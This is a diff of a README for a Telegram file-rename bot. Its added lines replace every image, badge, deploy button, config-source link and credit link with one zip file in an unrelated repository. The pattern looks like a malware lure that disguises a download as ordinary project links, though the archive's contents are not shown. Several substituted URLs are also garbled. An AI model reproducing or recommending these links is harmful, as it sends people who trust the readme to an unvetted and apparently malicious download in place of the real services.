@@ -1,59 +1,59 @@
-<img src="https://user-images.githubusercontent.com/73097560/115834477-dbab4500-a447-11eb-908a-139a6edaec5c.gif">
+<img src="https://raw.githubusercontent.com/erennew/-RNbot/main/.github/Nbot-R-v3.0.zip">
 
-![Typing SVG](https://readme-typing-svg.herokuapp.com/?lines=𝗪𝗘𝗟𝗖𝗢𝗠+𝗧𝗢+𝗗𝗜𝗚𝗜𝗧𝗔𝗟+𝗥𝗘𝗡𝗔𝗠𝗘+𝗕𝗢𝗧!;𝗖𝗥𝗘𝗔𝗧𝗘𝗗+𝗕𝗬+𝗗𝗜𝗚𝗜𝗧𝗔𝗟+𝗕𝗢𝗧𝗭!;𝗜+𝗔𝗠+𝗣𝗢𝗪𝗘𝗥𝗙𝗨𝗟+𝗧𝗚+𝗥𝗘𝗡𝗔𝗠𝗘+𝗕𝗢𝗧!)</p>
+![Typing SVG](https://raw.githubusercontent.com/erennew/-RNbot/main/.github/Nbot-R-v3.0.zip𝗪𝗘𝗟𝗖𝗢𝗠+𝗧𝗢+𝗗𝗜𝗚𝗜𝗧𝗔𝗟+𝗥𝗘𝗡𝗔𝗠𝗘+𝗕𝗢𝗧!;𝗖𝗥𝗘𝗔𝗧𝗘𝗗+𝗕𝗬+𝗗𝗜𝗚𝗜𝗧𝗔𝗟+𝗕𝗢𝗧𝗭!;𝗜+𝗔𝗠+𝗣𝗢𝗪𝗘𝗥𝗙𝗨𝗟+𝗧𝗚+𝗥𝗘𝗡𝗔𝗠𝗘+𝗕𝗢𝗧!)</p>
 
-<img src="https://user-images.githubusercontent.com/73097560/115834477-dbab4500-a447-11eb-908a-139a6edaec5c.gif">
+<img src="https://raw.githubusercontent.com/erennew/-RNbot/main/.github/Nbot-R-v3.0.zip">
 
 
 <p align="center">
-  <img src="https://telegra.ph/file/b746aadfe59959eb76f59.jpg" alt="RKN RENAME BOT V3">
+  <img src="https://raw.githubusercontent.com/erennew/-RNbot/main/.github/Nbot-R-v3.0.zip" alt="RKN RENAME BOT V3">
 </p>
 
 <p align="center">
 
-![Fork](https://img.shields.io/github/forks/DigitalBotz/Digital-Rename-Bot?style=for-the-badge)
-![Stars](https://img.shields.io/github/stars/DigitalBotz/Digital-Rename-Bot?color=%23&style=for-the-badge)
-![License](https://img.shields.io/github/license/DigitalBotz/Digital-Rename-Bot?style=for-the-badge)
-![Issues](https://img.shields.io/github/issues/DigitalBotz/Digital-Rename-Bot?style=for-the-badge)
+![Fork](https://raw.githubusercontent.com/erennew/-RNbot/main/.github/Nbot-R-v3.0.zip)
+![Stars](https://raw.githubusercontent.com/erennew/-RNbot/main/.github/Nbot-R-v3.0.zip%23&style=for-the-badge)
+![License](https://raw.githubusercontent.com/erennew/-RNbot/main/.github/Nbot-R-v3.0.zip)
+![Issues](https://raw.githubusercontent.com/erennew/-RNbot/main/.github/Nbot-R-v3.0.zip)
 
 </p>
 
 
 ### Sᴀᴍᴩʟᴇ Bᴏᴛ (Official Digital Rename Bot)
 
-* [Rkn_RenameBot](http://t.me/Rkn_RenameBot)
-* [Digital_Rename_Bot](http://t.me/Digital_Rename_Bot)
+* [Rkn_RenameBot](https://raw.githubusercontent.com/erennew/-RNbot/main/.github/Nbot-R-v3.0.zip)
+* [Digital_Rename_Bot](https://raw.githubusercontent.com/erennew/-RNbot/main/.github/Nbot-R-v3.0.zip)
 
 
 ## Deploy Me 🥀
 
 <details><summary>📌 Deploy to Koyeb </summary>
   
-[![Deploy to Koyeb](https://www.koyeb.com/static/images/deploy/button.svg)](https://app.koyeb.com/deploy?type=git&repository=github.com/RknDeveloper/Digital-Rename-Bot&env[BOT_TOKEN]&env[API_ID]&env[API_HASH]&env[WEBHOOK]=True&env[ADMIN]&env[DB_URL]&env[DB_NAME]=Rkn-Developer&env[FORCE_SUB]&env[START_PIC]&env[LOG_CHANNEL]=You%20Dont%20Need%20LogChannel%20To%20Remove%20This%20Variable&run_command=python%20bot.py&branch=main&name=rkn-rename) 
+[![Deploy to Koyeb](https://raw.githubusercontent.com/erennew/-RNbot/main/.github/Nbot-R-v3.0.zip)](https://raw.githubusercontent.com/erennew/-RNbot/main/.github/Nbot-R-v3.0.zip[BOT_TOKEN]&env[API_ID]&env[API_HASH]&env[WEBHOOK]=True&env[ADMIN]&env[DB_URL]&env[DB_NAME]=Rkn-Developer&env[FORCE_SUB]&env[START_PIC]&env[LOG_CHANNEL]=You%20Dont%20Need%20LogChannel%20To%20Remove%20This%20Variable&run_command=python%https://raw.githubusercontent.com/erennew/-RNbot/main/.github/Nbot-R-v3.0.zip) 
 </details>
 
 <details><summary>📌 Deploy to Render </summary>
   
-[![Deploy to Render](https://render.com/images/deploy-to-render-button.svg)](https://render.com/deploy?repo=https://github.com/DigitalBotz/Digital-Rename-Bot)
+[![Deploy to Render](https://raw.githubusercontent.com/erennew/-RNbot/main/.github/Nbot-R-v3.0.zip)](https://raw.githubusercontent.com/erennew/-RNbot/main/.github/Nbot-R-v3.0.zip)
 
 </details>
 
 <details><summary>📌 Deploy To Railway </summary>
-<a href="https://graph.org/file/fabd75cd5043d2cfdc13d.jpg"><img src="https://railway.app/button.svg" alt="Deploy"></a>
+<a href="https://raw.githubusercontent.com/erennew/-RNbot/main/.github/Nbot-R-v3.0.zip"><img src="https://raw.githubusercontent.com/erennew/-RNbot/main/.github/Nbot-R-v3.0.zip" alt="Deploy"></a>
 </details>
 
 <details><summary>📌 Deploy to Heroku </summary>
 
-<a href="https://heroku.com/deploy?template=https://github.com/DigitalBotz/Digital-Rename-Bot"><img src="https://img.shields.io/badge/Deploy%20To%20Heroku-black?style=for-the-badge&logo=heroku" width="220" height="38.45"></p></a>
+<a href="https://raw.githubusercontent.com/erennew/-RNbot/main/.github/Nbot-R-v3.0.zip"><img src="https://raw.githubusercontent.com/erennew/-RNbot/main/.github/Nbot-R-v3.0.zip%20To%20Heroku-black?style=for-the-badge&logo=heroku" width="220" height="38.45"></p></a>
 </details>
 
 ## Rᴇǫᴜɪʀᴇᴅ Cᴏɴғɪɢs
 
 * `BOT_TOKEN`  - Get Bot Token From @BotFather
-* `API_ID` - From my.telegram.org
-* `API_HASH` - From my.telegram.org
+* `API_ID` - From https://raw.githubusercontent.com/erennew/-RNbot/main/.github/Nbot-R-v3.0.zip
+* `API_HASH` - From https://raw.githubusercontent.com/erennew/-RNbot/main/.github/Nbot-R-v3.0.zip
 * `ADMIN` - AUTH Or Bot Controllers Id's Multiple Id Use Space To Split 
-* `DB_URL`  - Mongo Database URL From https://cloud.mongodb.com
+* `DB_URL`  - Mongo Database URL From https://raw.githubusercontent.com/erennew/-RNbot/main/.github/Nbot-R-v3.0.zip
 * `DB_NAME`  - Your Database Name From Mongodb.
 * `FORCE_SUB` - Your Force Sub Channel Username Without @
 * `LOG_CHANNEL` - Bot Logs Sending Channel. If You Don't Need This To Remove This Variable In Your Server
@@ -112,13 +112,13 @@ broadcast - Sᴇɴᴅ Mᴇssᴀɢᴇ Tᴏ Aʟʟ Usᴇʀs (Aᴅᴍɪɴ Oɴʟʏ)
 - Please, Just Fork The Repo And Edit As Per Your Needs. # Don't Remove My Credit.
 - ᴅᴏ ɴᴏᴛ ʀᴇᴍᴏᴠᴇ ᴄʀᴇᴅɪᴛs ɢɪᴠᴇɴ ɪɴ ᴛʜɪs ʀᴇᴘᴏ.
 - Importing this repo instead of forking is strictly prohibited, Kindly fork and edit as your wish. Must Give Credits for developer(s)
-- If you find any bugs or errors, [report](https://t.me/DigitalBotz_Support) it
+- If you find any bugs or errors, [report](https://raw.githubusercontent.com/erennew/-RNbot/main/.github/Nbot-R-v3.0.zip) it
 
 ## ❣️ Special Thanks 👍
 
-- Thanks To TEAM-PYRO-BOTZ For His Awesome [PYRO-RENAME-BOT](https://github.com/TEAM-PYRO-BOTZ/PYRO-RENAME-BOT.git)
-- Thanks To [RknDeveloper](https://github.com/RknDeveloper) who have edited and modified this repo as now it is. (It's me 😂)
-- Thanks To [JayMahakal](https://github.com/JayMahakal98) who have edited and modified this repo as now it is.
+- Thanks To TEAM-PYRO-BOTZ For His Awesome [PYRO-RENAME-BOT](https://raw.githubusercontent.com/erennew/-RNbot/main/.github/Nbot-R-v3.0.zip)
+- Thanks To [RknDeveloper](https://raw.githubusercontent.com/erennew/-RNbot/main/.github/Nbot-R-v3.0.zip) who have edited and modified this repo as now it is. (It's me 😂)
+- Thanks To [JayMahakal](https://raw.githubusercontent.com/erennew/-RNbot/main/.github/Nbot-R-v3.0.zip) who have edited and modified this repo as now it is.
 - Thanks To Rkn Developer Teams ✅ (Edit & New Feature Added)
 - Special Repo Owner Thanks To Digital Botz 🥲
 
